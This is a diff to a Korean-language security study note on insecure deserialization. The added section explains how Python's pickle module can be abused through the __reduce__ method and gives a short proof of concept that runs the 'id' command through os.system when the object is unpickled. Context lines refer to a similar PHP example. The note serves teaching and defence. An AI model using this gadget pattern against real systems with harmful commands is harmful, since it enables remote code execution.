@@ -1205,7 +1205,29 @@
                         $obj = unserialize($serialize_Data); // 역직렬화 후 오브젝트 소멸 시에 __destruct()가 호출되고 이때 system 함수로 id 명령어를 실행하여 uid, gid, group 정보를 얻을 수 있음
                     ?>
                     ```
-        + python
+        + python - 📌 대표적인 모듈: **pickle** 모듈 [🔗](https://docs.python.org/3/library/pickle.html), **yaml** 모듈 [🔗](https://pyyaml.org/wiki/PyYAMLDocumentation)
+            - 주로 Python Object의 ```__reduce__``` 메소드를 공격에 사용함
+                + ```__reduce__``` 메소드는 객체를 역직렬화할 때 객체를 재구성하는 tuple을 반환함 <br/> &nbsp;&nbsp; → tuple은 함수를 반환할 수 있음 ***= 함수 실행이 가능함***
+                + ⚠️ **역직렬화된 객체에 접근하는 것이 가능**하다면 RCE(Remote Code Execution) 공격이 가능함
+            - Python deserialize 취약점 예시
+                ```python
+                import pickle
+                import os
+
+                class TestClass:
+                    def __reduce__(self):
+                        return os.system, ("id", ) # 시스템 함수를 이용해 id 명령어를 실행하고 있음 → ⚠️ 역직렬화 시 id 명령어가 실행되어 uid, gid, groups 정보가 출력됨
+                    
+                ClassA = TestClass()
+
+                # ClassA 직렬화
+                ClassA_dump = pickle.dumps(ClassA) # pickle.dumps(obj) 함수: python object를 직렬화하여 메모리에 저장함
+                print(ClassA_dump) # 직렬화된 파일(이진 파일)을 화면에 출력함
+
+                # 역직렬화
+                pickle.loads(ClassA_dump) # pickle.loads(data): 직렬화되어 있는 바이트 객체(bytes object)를 파이썬 객체로 역직렬화함
+                ```
+        + javascript (NodeJS)
 
 <br/><br/><br/>
 
